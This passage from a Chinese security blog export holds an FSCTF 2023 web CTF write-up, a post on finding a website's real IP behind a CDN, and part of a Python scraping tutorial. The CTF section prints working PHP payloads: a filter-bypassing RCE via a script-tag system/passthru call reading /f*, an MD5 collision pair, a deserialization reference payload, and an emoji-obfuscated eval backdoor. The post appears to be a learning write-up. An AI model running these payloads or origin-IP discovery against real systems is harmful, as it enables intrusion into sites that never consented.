可以用paste，uniq等命令或者用&#x27; \ &#x27;符号绕过命令的过滤限制</span><br><span class="line">    if (preg_match(&quot;/cat|tac|tail|more|head|nl|flag|less| /&quot;, $word))&#123;</span><br><span class="line">       die(&quot;nonono.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // 将word中的&quot; ? &quot;替换成空字符</span><br><span class="line">    $word = str_replace(&quot;?&quot;, &quot;&quot;, $word); </span><br><span class="line">    // &quot;?&gt;&quot; 将php闭合了,所以我们要用到标签来rce</span><br><span class="line">    eval(&quot;?&gt;&quot;. $word);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计后根据waf写payload绕过<br>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">word=&lt;script%09language=&quot;php&quot;&gt;system(&#x27;paste%09/f*&#x27;);</span><br><span class="line">或者</span><br><span class="line">word=&lt;script%09language=&quot;php&quot;&gt;passthru(&#x27;ca\t%09/f*&#x27;);</span><br></pre></td></tr></table></figure><p>得到flag<br><img src="/img/2023FSCTFwebWP/52.png" alt="title"></p><ul><li>php短标签:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.​&lt;? echo &#x27;123&#x27;;?&gt; #前提是开启配置参数short_open_tags=on​​</span><br><span class="line">​2.&lt;script language=&quot;php&quot;&gt;echo &#x27;hello&#x27;; #不需要修改参数开关，但是只能在7.0以下可用。​​</span><br><span class="line">​3.&lt;% echo &#x27;123&#x27;;%&gt; #开启配置参数asp_tags=on，并且只能在7.0以下</span><br></pre></td></tr></table></figure></li></ul><h2 id="ez-php1"><a href="#ez-php1" class="headerlink" title="ez_php1"></a>ez_php1</h2><p><img src="/img/2023FSCTFwebWP/61.png" alt="title"><br>话不多说,先代码审计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;globals.php&quot;;</span><br><span class="line">$a = $_GET[&#x27;b&#x27;];</span><br><span class="line">$b = $_GET[&#x27;a&#x27;];             // 用变量a,b分别接收get请求的a,b参数</span><br><span class="line">if($a!=$b&amp;&amp;md5($a)==md5($b)) // a,b两个参数不相同,但是要求a,b两个参数的md5加密后值相同 可以查一下加密后md5值相同的两个数(md5碰撞对:QNKCDZO和240610708)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;!!!&quot;;</span><br><span class="line">    $c = $_POST[&#x27;FL_AG&#x27;];    // 用变量c来接受一个post方式提交的FL_AG参数</span><br><span class="line">    if(isset($c))            // 判断c是否为</span><br><span class="line">    &#123;</span><br><span class="line">        if (preg_match(&#x27;/^.*(flag).*$/&#x27;, $ja)) &#123; // 过滤符号</span><br><span class="line">            echo &#x27;You are bad guy!!!&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">            else &#123;</span><br><span class="line">                echo &quot;Congratulation!!&quot;;</span><br><span class="line">                echo $hint1;                    // 输出提示1</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        echo &quot;Please input my love FL_AG&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else&#123;</span><br><span class="line">    die(&quot;game over!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>根据代码审计的结果构造payload,使其输出$hint1<br>用hackbar发包<br><img src="/img/2023FSCTFwebWP/62.png" alt="title"><br><img src="/img/2023FSCTFwebWP/63.png" alt="title"><br>得到提示1:L0vey0U.php<br>访问L0vey0U.php<br><img src="/img/2023FSCTFwebWP/64.png" alt="title"><br>一样的,代码审计</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;globals.php&quot;;</span><br><span class="line">$FAKE_KEY = &quot;Do you love CTF?&quot;;</span><br><span class="line">$KEY = &quot;YES I love&quot;;</span><br><span class="line">$str = $_GET[&#x27;str&#x27;];    // $str接受一个get请求的str参数</span><br><span class="line">echo $flag;</span><br><span class="line">// 如果$str反序列化的值等于$KEY的值,那么输出提示2</span><br><span class="line">if (unserialize($str) === &quot;$KEY&quot;)   </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;$hint2&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>根据代码审计的结果,我们需要对$KEY进行序列化,然后再用get方式请求就可以得到提示2<br>对$KEY进行序列化:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$KEY = &quot;YES I love&quot;;</span><br><span class="line">echo serialize($KEY); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>反序列化的结果是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s:10:&quot;YES I love&quot;;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str=s:10:&quot;YES I love&quot;;</span><br></pre></td></tr></table></figure><p><img src="/img/2023FSCTFwebWP/65.png" alt="title"><br>得到提示2:P0int.php,访问<br><img src="/img/2023FSCTFwebWP/66.png" alt="title"><br>代码审计一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__); // 输出当前文件的源代码，并进行语法高亮显示</span><br><span class="line">error_reporting(0); // 关闭错误报告</span><br><span class="line"></span><br><span class="line">class Clazz // 定义一个名为Clazz的类</span><br><span class="line">&#123;</span><br><span class="line">    public $a; // 定义一个公共属性$a</span><br><span class="line">    public $b; // 定义一个公共属性$b</span><br><span class="line"></span><br><span class="line">    public function __wakeup() // 当对象被反序列化时，会自动调用此魔术方法</span><br><span class="line">    &#123;</span><br><span class="line">        // 从文件g0t_f1ag.php中读取内容，将其进行base64编码，然后赋值给$a</span><br><span class="line">        $this-&gt;a = file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=g0t_f1ag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() // 当对象被销毁（即在脚本结束时）时，会自动调用此魔术方法</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;b; // 输出$b的值</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unserialize($_POST[&#x27;data&#x27;]); // 对POST参数&#x27;data&#x27;进行反序列化，并忽略任何错误（由于@符号）</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>根据代码审计的的结果:</li></ul><ol><li>我们需要传入一个序列化的对象(Clazz类),然后使它反序列化然后自动调用两种魔术方法</li><li>$a接收了g0t_f1ag.php的base64编码后面的内容,但是没有输出$a 的语句,只有输出$b的语句,所以我们需要用$b来引用$a,实现对$a的输出</li></ol><ul><li>得到序列化的对象<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Clazz</span><br><span class="line">&#123;</span><br><span class="line">    public $a;</span><br><span class="line">    public $b;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;b = &amp;$this-&gt;a; // 引用$a</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = file_get_contents(&quot;php://filter/read=convert.base64-encode/resource=g0t_f1ag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$test = new Clazz();</span><br><span class="line">echo serialize($test);   </span><br></pre></td></tr></table></figure>输出结果:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:5:&quot;Clazz&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure>POST提交参数<br><img src="/img/2023FSCTFwebWP/67.png" alt="title"><br>得到一串base64编码的字符串<br><img src="/img/2023FSCTFwebWP/68.png" alt="title"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD8NCiRGTEFHPSAiRkxBR3t5MHVfYXJlX2wwdmUhISEhfSINCj8+DQo=</span><br></pre></td></tr></table></figure>base64解码得到flag<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">$FLAG= &quot;FLAG&#123;y0u_are_l0ve!!!!&#125;&quot;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="寻找蛛丝马迹"><a href="#寻找蛛丝马迹" class="headerlink" title="寻找蛛丝马迹"></a>寻找蛛丝马迹</h2><p><img src="/img/2023FSCTFwebWP/71.png" alt="title"><br>点了一下,没啥反应,根据题目提示,应该是信息搜集类型的题目,Ctrl+U看看源码<br><img src="/img/2023FSCTFwebWP/72.png" alt="title"><br>找到第一段flag: <strong>FSCTF{Tell_y0U_n</strong><br>点了一下css文件,发现有乱码的注释<br><img src="/img/2023FSCTFwebWP/73.png" alt="title"><br>保存下来看看<br><img src="/img/2023FSCTFwebWP/74.png" alt="title"><br>发现第二段flag: <strong>oT_To_p</strong><br>根据提示,同上打开js文件看看<br><img src="/img/2023FSCTFwebWP/75.png" alt="title"><br>保存下来查看<br><img src="/img/2023FSCTFwebWP/76.png" alt="title"><br>发现第三段flag: <strong>oInT_oUt_</strong><br>dirsearch直接开扫<br>发现robots.txt <a href="http://www.zip/">www.zip</a> 和 DS_store<br>得到后面的三段flag: <strong>tH@t_y000</strong> <strong>u_Don’t_</strong> <strong>believe_it!}</strong><br>拼接起来,flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FSCTF&#123;Tell_y0U_noT_To_poInT_oUt_tH@t_y000u_Don&#x27;t_believe_it!&#125;</span><br></pre></td></tr></table></figure><h2 id="签到plus"><a href="#签到plus" class="headerlink" title="签到plus"></a>签到plus</h2><p>根据题目提示,被黑客接管了,可以猜测存在后门,工具扫一下目录<br><img src="/img/2023FSCTFwebWP/81.png" alt="title"><br>发现shell.php,访问<br><img src="/img/2023FSCTFwebWP/82.png" alt="title"><br>一个phpinfo界面,Ctrl+F找一下flag<br><img src="/img/2023FSCTFwebWP/83.png" alt="title"><br>找了个假的flag,观察了一下php的版本,搜一下看看有没有可以利用的漏洞<br><img src="/img/2023FSCTFwebWP/84.png" alt="title"><br>根据如图构造payload<br><img src="/img/2023FSCTFwebWP/85.png" alt="title"><br>响应包如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Host: node4.anna.nssctf.cn:28142</span><br><span class="line">Date: Thu, 02 Nov 2023 00:35:28 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 443</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">$😀=&quot;a&quot;;</span><br><span class="line">$😁=&quot;b&quot;;</span><br><span class="line">$😂=&quot;c&quot;;</span><br><span class="line">$🤣=&quot;d&quot;;</span><br><span class="line">$😃=&quot;e&quot;;</span><br><span class="line">$😄=&quot;f&quot;;</span><br><span class="line">$😅=&quot;g&quot;;</span><br><span class="line">$😆=&quot;h&quot;;</span><br><span class="line">$😉=&quot;i&quot;;</span><br><span class="line">$😊=&quot;j&quot;;</span><br><span class="line">$😋=&quot;k&quot;;</span><br><span class="line">$😎=&quot;l&quot;;</span><br><span class="line">$😍=&quot;m&quot;;</span><br><span class="line">$😘=&quot;n&quot;;</span><br><span class="line">$😗=&quot;o&quot;;</span><br><span class="line">$😙=&quot;p&quot;;</span><br><span class="line">$😚=&quot;q&quot;;</span><br><span class="line">$🙂=&quot;r&quot;;</span><br><span class="line">$🤗=&quot;s&quot;;</span><br><span class="line">$🤩=&quot;t&quot;;</span><br><span class="line">$🤔=&quot;u&quot;;</span><br><span class="line">$🤨=&quot;v&quot;;</span><br><span class="line">$😐=&quot;w&quot;;</span><br><span class="line">$😑=&quot;x&quot;;</span><br><span class="line">$😶=&quot;y&quot;;</span><br><span class="line">$🙄=&quot;z&quot;;</span><br><span class="line"></span><br><span class="line">$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;👽🦐&#x27;])) &#123;</span><br><span class="line">    eval($😭($_GET[&#x27;👽🦐&#x27;]));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>和之前那道rce的题目一样,拿到flag<br><img src="/img/2023FSCTFwebWP/86.png" alt="title"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN技术及绕过</title>
      <link href="/2023/10/18/CDN%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%BB%95%E8%BF%87/"/>
      <url>/2023/10/18/CDN%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h1><h2 id="什么是CDN"><a href="#什么是CDN" class="headerlink" title="什么是CDN"></a>什么是CDN</h2><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在CDN服务，将会影响到后续的安全测试过程。</p><ul><li>个人理解:一种服务，CDN服务商将目标网站的资源缓存到自己的服务器上，供用户快速访问，如果目标资源不存在，再去请求主站。</li></ul><h2 id="CDN的作用"><a href="#CDN的作用" class="headerlink" title="CDN的作用"></a>CDN的作用</h2><ol><li>减少网络延迟和传输时间，提高用户的访问速度和响应时间。</li><li>分散流量，减轻源服务器的负载压力。</li><li>提供高可用性和容错能力，当有服务器故障时，其他服务器可以接替其工作。</li><li>提供更好的安全性，例如防止DDoS攻击。</li></ol><h2 id="CDN对于安全测试的影响"><a href="#CDN对于安全测试的影响" class="headerlink" title="CDN对于安全测试的影响"></a>CDN对于安全测试的影响</h2><p>cdn会隐藏服务器真实的ip地址，无法对目标网站的操作系统进行渗透，但cdn站点又可以理解为是目标站点的镜像站点（大多数都是静态cdn加速），拥有相同的网站架构，且cdn服务器可与站点服务器进行交互，因此sql注入，xss等漏洞的挖掘并不受太大影响。</p><p>注:如果直接访问CDN站点的ip地址，一般无法看到和主站一样的网页，如果看到了，可能是私有CDN服务</p><h1 id="CDN判断及绕过思路"><a href="#CDN判断及绕过思路" class="headerlink" title="CDN判断及绕过思路"></a>CDN判断及绕过思路</h1><h2 id="CDN存在判断"><a href="#CDN存在判断" class="headerlink" title="CDN存在判断"></a>CDN存在判断</h2><p>使用超级ping工具<br>若目标存在多个IP的话，很有可能采用了CDN服务,以下为ping <a href="http://www.baidu.com的结果/">www.baidu.com的结果</a><br><img src="/img/CDN%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%BB%95%E8%BF%87/1.png" alt="title"></p><h2 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h2><p>1.子域名查询<br>某些企业业务线众多，亦或者成本因素，有些站点的主站使用了CDN服务，或者部分域名使用了CDN服务，某些子域名可能未使用。<br>可以通过超级ping工具去ping子域名来实现绕过<br>2.邮件服务查询<br>一些站点的邮箱服务可能来自于真实的IP，当给你发邮件时，你可以通过邮件源代码或者邮件头查看到目标的真实IP。<br><a href="https://www.sysgeek.cn/how-to-trace-emails/">https://www.sysgeek.cn/how-to-trace-emails/</a><br>3.国外地址请求（尽量用偏僻的小国家节点去请求）<br>一些站点由于服务对象基本在国内，或者成本原因，在国外一些地方没有CDN服务，如果用国外的服务器去请求站点域名，则会访问到站点的真实地址。<br>可以开VPN全局代理然后ping或者用全球ping工具<br>4.遗留文件，扫描全网（不太实用）<br>一些站点在搭建之初，会用一些文件测试站点，例如“phpinfo()”文件，此类文件里就有可能包含了真实的IP地址。可以利用Google搜索引擎搜索关键字“site:xxx.com inurl:phpinfo.php”，搜索站点是否有遗留文件。<br><img src="/img/CDN%E6%8A%80%E6%9C%AF%E5%8F%8A%E7%BB%95%E8%BF%87/2.png" alt="title"><br>5.黑暗引搜索指定文件<br>这里的特定文件，指的是站点的icon文件，也就是网站的图标，一般查看网页源代码可以找到，格式大致“<a href="http://www.xx.com/favicon.ico%E2%80%9D%E3%80%82">http://www.xx.com/favicon.ico”。</a><br>在shodan搜索网站icon图标的语法为：http.favicon.hash:hash值，hash是一个未知的随机数，我们可以通过shodan或者Fofa语法hash值，来进一步获取到所有带有某icon的网站。<br>最好结合灯塔来获得hash<br><strong>1,2,3最实用</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python爬虫</title>
      <link href="/2023/09/15/%E7%88%AC%E8%99%AB/"/>
      <url>/2023/09/15/%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="request模块"><a href="#request模块" class="headerlink" title="request模块"></a>request模块</h2><p>模块导入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br></pre></td></tr></table></figure><h3 id="使用request模块发送get，post请求"><a href="#使用request模块发送get，post请求" class="headerlink" title="使用request模块发送get，post请求"></a>使用request模块发送get，post请求</h3><ul><li>response &#x3D; requests.get(url,headers&#x3D;headers,params,timeout)</li><li>response &#x3D; requests.post(url,data&#x3D;{请求体的字典})<br>参数说明如下</li><li>url：要抓取的 url 地址。</li><li>headers：用于包装请求头信息，以字典形式，一般包装useragent。</li><li>params：请求时携带的查询字符串参数。</li><li>timeout：超时时间，超过时间会抛出异常，例如 timeout &#x3D; 3 设置超时时间为3秒<br>发送请求后服务器返回一个 HttpResponse 响应对象<br>将其打印出来</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line"># 百度翻译</span><br><span class="line">url = &#x27;https://fanyi.baidu.com&#x27;</span><br><span class="line"># post请求体携带的参数，可通过开发者调试工具查看</span><br><span class="line">data = &#123;&#x27;from&#x27;: &#x27;zh&#x27;,</span><br><span class="line">        &#x27;to&#x27;: &#x27;en&#x27;,</span><br><span class="line">        &#x27;query&#x27;: &#x27;你好&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">response = requests.post(url, data=data)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Response [200]&gt;</span><br></pre></td></tr></table></figure><p>该HttpResponse 响应对象具有以下常用属性：</p><p><img src="/img/%E7%88%AC%E8%99%AB/HttpResponse%E5%93%8D%E5%BA%94%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7.png" alt="title"></p><h3 id="response-的几种方法"><a href="#response-的几种方法" class="headerlink" title="response 的几种方法"></a>response 的几种方法</h3><ol><li>print(response.encoding)     # 打印编码格式</li><li>response.encoding&#x3D;”utf-8”    # 更改为utf-8编码（一般网页为utf-8编码格式）</li><li>print(response.text)         # 以字符串形式打印网页源码<br>该方式往往会出现乱码，往往配合response.encoding使用</li><li>print(response.content)      # 以二进制字节流形式打印网页源码<br>以二进制字节流形式打印中文会不显示，一般用**response.content.decode()**将响应的二进制字节流形式转化为str类型，括号内可以指定编码格式，如果不填，默认为utf-8，有时候中文无法显示可以用”gbk”的编码格式去解码</li><li>print(response.status_code)  # 打印状态码</li><li>print(response.url)          # 打印响应的url地址</li><li>print(response.request.url)  # 打印发送请求的url地址<br>一般响应的url地址和发送请求的url地址是一样的，除非发生重定向，使得响应的url和发生时的url不一样</li><li>print(response.headers)      # 打印响应头信息</li><li>print(response.request.headers) # 打印请求头信息</li><li>print(response.cookies)      # 打印cookie信息</li></ol><h3 id="处理需要携带cookie的请求"><a href="#处理需要携带cookie的请求" class="headerlink" title="处理需要携带cookie的请求"></a>处理需要携带cookie的请求</h3><ul><li>直接携带cookie请求url地址<ol><li>将cookie放在headers中:<br> 直接去浏览器中复制cookie字符串，加在headers中  </li><li>将cookie字符串转为字典形式然后再传给cookies参数:<br> requests.get(url,cookies&#x3D;cookie_dict)<br> 其中，可以用字典推导式，快速将cookie以字符串形式转化为字典形式，代码如下: <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cookie = &quot;phid=6666; sid=999&quot;</span><br><span class="line">cookie_dict = &#123;i.split(&quot;=&quot;)[0]:i.split(&quot;=&quot;)[-1] for i in cookie.split(&quot;;&quot;)&#125;</span><br><span class="line">print(cookie_dict)</span><br></pre></td></tr></table></figure> 运行结果为 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;phid&#x27;: &#x27;6666&#x27;, &#x27; sid&#x27;: &#x27;999&#x27;&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li>先发送post请求,获取cookie,再带上cookie去请求登录后的页面<ol><li>实例化session(session具有的方法和requests一样)<br>session &#x3D; requests.session()</li><li>用session去发送一个post请求得到保存在本地的cookie(cookie会保存在session中)<br>session.post(url,data,headers)</li><li>再使用session去请求登录后的页面<br>response &#x3D; session.get(url,headers)</li></ol></li></ul><h2 id="retrying模块"><a href="#retrying模块" class="headerlink" title="retrying模块"></a>retrying模块</h2><p>模块导入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from retrying import retry </span><br></pre></td></tr></table></figure><p>使用方法:<br>在请求响应的函数前面加上@retry方法<br>如:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@retry(stop_max_attempt_number=3) #让被装饰的函数反复执行三次，三次全部报错才会报错</span><br><span class="line">def parse_url(url): #定义的一个专门请求url的一个函数</span><br><span class="line">    response = requests.get(url,headers=headers,timeout=5)</span><br><span class="line">    return response.content.decode()</span><br></pre></td></tr></table></figure><h2 id="使用fake-useragent模块来伪造User-Agent"><a href="#使用fake-useragent模块来伪造User-Agent" class="headerlink" title="使用fake-useragent模块来伪造User-Agent"></a>使用fake-useragent模块来伪造User-Agent</h2><p>短时间内总使用一个 UA 高频率访问的网站，可能会引起网站的警觉，从而封杀掉 IP,所以我们构造多个UA来绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from fake_useragent import UserAgent</span><br><span class="line">#实例化一个对象</span><br><span class="line">User_Agent=UserAgent()</span><br><span class="line"># 随机获取浏览器useragent</span><br><span class="line">print(User_Agent.chrome)</span><br><span class="line">print(User_Agent.edge)</span><br><span class="line">print(User_Agent.firefox)</span><br><span class="line"># 获取随机的ua头</span><br><span class="line">print(User_Agent.random)</span><br></pre></td></tr></table></figure><p>运行结果为:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36</span><br></pre></td></tr></table></figure><p>爬虫程序中的具体使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from fake_useragent import UserAgent</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">ua = UserAgent()</span><br><span class="line">headers = &#123;&quot;User-Agent&quot;: ua.random&#125;</span><br><span class="line">get_url = &quot;https://wwww.baidu.com&quot;</span><br><span class="line">response = requests.get(get_url, headers=headers)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><h2 id="json-模块"><a href="#json-模块" class="headerlink" title="json 模块"></a>json 模块</h2><p>当响应包为json格式数据就要用到python中json模块去解析</p><p>JSON（JavaScript Object Notation）是一种轻量级的数据交换格式，常用于前后端之间的数据传输和存储，遵循欧洲计算机协会制定的 JavaScript 规范（简称 ECMAScript）。JSON 易于人阅读和编写，同时也易于机器解析和生成，能够有效的提升网信息的传输效率，因此它常被作为网络、程序之间传递信息的标准语言，比如客户端与服务器之间信息交互就是以 JSON 